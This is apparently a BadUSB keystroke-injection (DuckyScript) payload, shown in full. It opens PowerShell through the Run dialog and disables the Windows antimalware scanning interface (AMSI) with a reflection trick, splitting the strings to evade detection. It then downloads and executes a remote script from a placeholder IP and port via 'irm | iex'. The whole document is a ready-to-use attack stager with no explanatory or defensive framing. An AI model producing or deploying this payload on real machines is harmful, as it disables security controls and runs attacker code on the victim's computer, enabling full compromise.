GUI r
DELAY 300
STRING powershell
ENTER
DELAY 500
STRING $a = "System.Management.Automation.Amsi"+"Utils"
ENTER
DELAY 250
STRING $b = "amsiInit"+"Failed"
ENTER
DELAY 250
STRING [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
ENTER
DELAY 100
STRING irm http://<ip>:<port>/e.ps1 | iex
ENTER
